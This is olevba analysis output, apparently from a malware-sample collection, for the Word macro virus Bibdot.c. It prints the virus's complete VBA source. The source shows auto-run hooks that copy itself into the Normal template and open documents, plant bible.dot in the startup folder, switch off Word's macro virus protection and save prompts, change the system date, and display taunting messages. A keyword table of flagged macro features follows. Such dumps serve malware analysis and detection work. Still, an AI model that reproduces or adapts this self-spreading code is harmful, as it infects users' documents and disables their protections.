olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bibdot.c-1fb1d32cd8483ab0aff918fd5308424158ad896e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bibdot.c-1fb1d32cd8483ab0aff918fd5308424158ad896e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bible.bas 
in file: Virus.MSWord.Bibdot.c-1fb1d32cd8483ab0aff918fd5308424158ad896e - OLE stream: 'Macros/VBA/Bible'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function installto()
On Error Resume Next
Application.ScreenUpdating = False
des = NormalTemplate.Path + "\" + NormalTemplate.Name
        Application.OrganizerCopy Source:=des, _
            Destination:=ActiveDocument.FullName, Name:="Bible", _
            Object:=wdOrganizerObjectProjectItems
Application.ScreenUpdating = True
End Function
Function Installstart()
On Error Resume Next: On Error GoTo 0
Application.ScreenUpdating = False
 If Dir(Application.StartupPath + "\bible.dot") = "bible.dot" Then
 Application.ScreenUpdating = True
 Exit Function
 End If
 Documents.Open (RecentFiles(1))
     ActiveDocument.SaveAs FileName:=Application.StartupPath + "\bible.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
         ActiveDocument.Close
        Application.ScreenUpdating = True
End Function
Function install()
On Error Resume Next
Application.ScreenUpdating = False
des = NormalTemplate.Path + "\" + NormalTemplate.Name
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
            Destination:=des, Name:="Bible", _
            Object:=wdOrganizerObjectProjectItems
        With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
        End With
        Application.DisplayRecentFiles = True
        RecentFiles.Maximum = 5
        NormalTemplate.Save
        Application.ScreenUpdating = True
End Function
Sub AutoOpen()
Application.ScreenUpdating = False
Call install
Application.ScreenUpdating = True
End Sub


Sub AutoClose()
On Error Resume Next
If Left(ActiveDocument.Name, 8) <> "Document" Then
Call installto
Call install
Call Installstart
End If
End Sub
Sub AutoExit()
On Error Resume Next
If Left(ActiveDocument.Name, 8) <> "Document" Then
Call installto
Call install
Call Installstart
End If
End Sub

Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call installto
End Sub
Sub filesave()
On Error Resume Next
Call installto
ActiveDocument.Save
End Sub
Sub fileclose()
On Error Resume Next
If Left(ActiveDocument.Name, 8) <> "Document" Then
Call installto
Call Installstart
End If
End Sub
Sub ViewVBCode()
On Error Resume Next
d = Format(Now, "dddd")
Select Case d
Case "Sunday"
    msg = "I am controlling your Computer"
Case "Monday"
    msg = "Don't fear I am controlling man!"
Case "Tuesday"
    msg = "Don't fear maaaaaaaaaan!"
Case "Wednesday"
    msg = "Cool down man! "
Case "Thursday"
    msg = "You are a imbecile..! "
Case "Friday"
    msg = "You are a fool... ahh..ahh..ahh"
Case "Saturday"
    msg = "Oops........."
End Select
MsgBox msg, vbInformation, "I am saying"
Date = Date + 1
End Sub
Sub ToolsMacro()
On Error Resume Next
MsgBox "Shit..! macro expired..!! ", vbExclamation, "Died"
End Sub
Sub FileTemplates()

End Sub
Sub AutoExec()
On Error Resume Next
If Hour(Now) > 0 Then msg = "Good Morning..."
If Hour(Now) > 12 Then msg = "Good afternoon..."
If Hour(Now) > 14 Then msg = "Good evening..."
If Hour(Now) > 20 Then msg = "Good night..."
MsgBox msg & Application.UserName & Chr(10) & " Have a nice day", vbInformation, "Weclome"
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

